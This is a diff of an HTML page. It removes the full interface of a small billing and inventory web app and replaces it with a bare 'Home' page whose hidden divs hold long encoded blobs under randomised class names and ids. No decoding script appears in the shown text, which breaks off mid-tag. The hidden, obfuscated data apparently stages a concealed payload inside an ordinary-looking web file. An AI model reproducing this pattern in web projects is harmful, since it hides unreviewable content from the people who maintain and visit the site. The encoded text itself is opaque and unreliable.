@@ -1,274 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self';">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zyphora Creations — PBilling</title>
-    <link rel="stylesheet" href="styles.css">
+<meta charset="UTF-8">
+<title>Home</title>
+<style>.gzS9VR{display:none}.XXElbJ{outline:0}</style>
 </head>
 <body>
-    <div class="app-layout">
-        <!-- Sidebar Navigation -->
-        <aside class="sidebar">
-            <div class="brand">
-                <h2>Zyphora</h2>
-                <p>Creations — PBilling</p>
-            </div>
-            <nav class="nav-menu">
-                <a href="#" class="nav-item active" data-target="dashboard-view">Dashboard</a>
-                <a href="#" class="nav-item" data-target="new-bill-view">New Bill</a>
-                <a href="#" class="nav-item" data-target="products-view">Products & Stock</a>
-                <a href="#" class="nav-item" data-target="sales-view">Sales History</a>
-                <a href="#" class="nav-item" data-target="reports-view">Reports</a>
-                <a href="#" class="nav-item" data-target="settings-view">Settings</a>
-            </nav>
-        </aside>
-
-        <!-- Main Content Area -->
-        <main class="main-content">
-            <!-- Dashboard View -->
-            <section id="dashboard-view" class="view active">
-                <header class="view-header">
-                    <h1>Dashboard</h1>
-                    <p class="subtitle">Welcome to PBilling! Here is a sample overview of your business.</p>
-                </header>
-
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <h3>Today's Sales (Sample)</h3>
-                        <p class="stat-value">$1,245.00</p>
-                    </div>
-                    <div class="stat-card">
-                        <h3>Bills Generated (Sample)</h3>
-                        <p class="stat-value">24</p>
-                    </div>
-                    <div class="stat-card">
-                        <h3>Products in Stock</h3>
-                        <p class="stat-value" id="dashboard-total-stock">...</p>
-                    </div>
-                    <div class="stat-card alert">
-                        <h3>Low Stock Items</h3>
-                        <p class="stat-value" id="dashboard-low-stock">...</p>
-                    </div>
-                </div>
-
-                <div class="dashboard-content">
-                    <div class="recent-bills">
-                        <h3>Recent Bills (Sample Data)</h3>
-                        <table class="data-table">
-                            <thead>
-                                <tr>
-                                    <th>Bill ID</th>
-                                    <th>Time</th>
-                                    <th>Customer</th>
-                                    <th>Amount</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>#B-10024</td>
-                                    <td>10:45 AM</td>
-                                    <td>Walk-in Customer</td>
-                                    <td>$45.50</td>
-                                    <td><span class="badge success">Paid</span></td>
-                                </tr>
-                                <tr>
-                                    <td>#B-10023</td>
-                                    <td>09:30 AM</td>
-                                    <td>John Doe</td>
-                                    <td>$120.00</td>
-                                    <td><span class="badge success">Paid</span></td>
-                                </tr>
-                                <tr>
-                                    <td>#B-10022</td>
-                                    <td>Yesterday</td>
-                                    <td>ACME Corp</td>
-                                    <td>$850.00</td>
-                                    <td><span class="badge pending">Pending</span></td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div class="quick-actions">
-                        <h3>Quick Actions</h3>
-                        <div class="action-buttons">
-                            <button class="btn primary" id="btn-new-bill">Create New Bill</button>
-                            <button class="btn secondary" id="btn-add-product">Add Product</button>
-                            <button class="btn secondary" id="btn-view-reports">View Reports</button>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Products & Stock View -->
-            <section id="products-view" class="view">
-                <header class="view-header" style="display: flex; justify-content: space-between; align-items: center;">
-                    <div>
-                        <h1>Products & Stock</h1>
-                        <p class="subtitle">Manage your inventory and stock levels.</p>
-                    </div>
-                    <button class="btn primary" id="btn-show-add-product">Add New Product</button>
-                </header>
-                
-                <div class="products-container">
-                    <div class="filters-bar">
-                        <input type="text" id="product-search" placeholder="Search by name or SKU..." class="form-control">
-                        <select id="product-category-filter" class="form-control">
-                            <option value="">All Categories</option>
-                            <option value="Electronics">Electronics</option>
-                            <option value="Accessories">Accessories</option>
-                            <option value="Furniture">Furniture</option>
-                            <option value="General">General</option>
-                        </select>
-                    </div>
-                    
-                    <div class="table-container">
-                        <table class="data-table" id="products-table">
-                            <thead>
-                                <tr>
-                                    <th>SKU</th>
-                                    <th>Name</th>
-                                    <th>Category</th>
-                                    <th>Price</th>
-                                    <th>Stock</th>
-                                    <th>Status</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="products-table-body">
-                                <!-- Products will be loaded here dynamically -->
-                            </tbody>
-                        </table>
-                        <div id="products-loading" class="table-message">Loading inventory...</div>
-                        <div id="products-empty" class="table-message" style="display: none;">No products found.</div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Placeholder Views -->
-            <section id="new-bill-view" class="view">
-                <header class="view-header">
-                    <h1>New Bill</h1>
-                    <p class="subtitle">Create a new customer invoice (Placeholder Screen)</p>
-                </header>
-                <div class="placeholder-content">
-                    <p>The billing engine will be implemented here in the future.</p>
-                </div>
-            </section>
-
-            <section id="sales-view" class="view">
-                <header class="view-header">
-                    <h1>Sales History</h1>
-                    <p class="subtitle">View past transactions (Placeholder Screen)</p>
-                </header>
-                <div class="placeholder-content">
-                    <p>Past sales history will be displayed here.</p>
-                </div>
-            </section>
-
-            <section id="reports-view" class="view">
-                <header class="view-header">
-                    <h1>Reports</h1>
-                    <p class="subtitle">Business analytics and reports (Placeholder Screen)</p>
-                </header>
-                <div class="placeholder-content">
-                    <p>Business analytics will be available here.</p>
-                </div>
-            </section>
-
-            <section id="settings-view" class="view">
-                <header class="view-header">
-                    <h1>Settings</h1>
-                    <p class="subtitle">Application configuration (Placeholder Screen)</p>
-                </header>
-                <div class="placeholder-content">
-                    <p>Application settings will go here.</p>
-                </div>
-            </section>
-        </main>
-    </div>
-    
-    <!-- Add/Edit Product Modal -->
-    <div id="product-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 id="modal-title">Add Product</h2>
-                <span class="close-modal">&times;</span>
-            </div>
-            <form id="product-form">
-                <input type="hidden" id="product-id">
-                <div class="form-group">
-                    <label>SKU (Product Code)</label>
-                    <input type="text" id="product-sku" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label>Product Name</label>
-                    <input type="text" id="product-name" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label>Category</label>
-                    <select id="product-category" class="form-control">
-                        <option value="General">General</option>
-                        <option value="Electronics">Electronics</option>
-                        <option value="Accessories">Accessories</option>
-                        <option value="Furniture">Furniture</option>
-                    </select>
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>Purchase Price</label>
-                        <input type="number" id="product-purchase" class="form-control" step="0.01" min="0" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Selling Price</label>
-                        <input type="number" id="product-selling" class="form-control" step="0.01" min="0" required>
-                    </div>
-                </div>
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>Current Stock</label>
-                        <input type="number" id="product-stock" class="form-control" min="0" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Low Stock Alert At</label>
-                        <input type="number" id="product-alert" class="form-control" min="0" required>
-                    </div>
-                </div>
-                <div id="product-form-error" class="form-error"></div>
-                <div class="modal-footer">
-                    <button type="button" class="btn secondary close-modal-btn">Cancel</button>
-                    <button type="submit" class="btn primary">Save Product</button>
-                </div>
-            </form>
-        </div>
-    </div>
-    
-    <!-- Stock Update Modal -->
-    <div id="stock-modal" class="modal">
-        <div class="modal-content stock-modal-content">
-            <div class="modal-header">
-                <h2>Update Stock</h2>
-                <span class="close-stock-modal">&times;</span>
-            </div>
-            <form id="stock-form">
-                <input type="hidden" id="stock-product-id">
-                <p id="stock-product-name" style="margin-bottom: 15px; font-weight: 600;"></p>
-                <div class="form-group">
-                    <label>Quantity Change (e.g. 5 or -2)</label>
-                    <input type="number" id="stock-change" class="form-control" required>
-                </div>
-                <div id="stock-form-error" class="form-error"></div>
-                <div class="modal-footer">
-                    <button type="button" class="btn secondary close-stock-modal-btn">Cancel</button>
-                    <button type="submit" class="btn primary">Update</button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <script src="renderer.js"></script>
+<div id="zUrueeob0" style="display:none">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</div><div id="zUrueeob1" style="display:none">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</div><div id="zUrueeob2" style="display:none">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</div><div id="zUrueeob3" 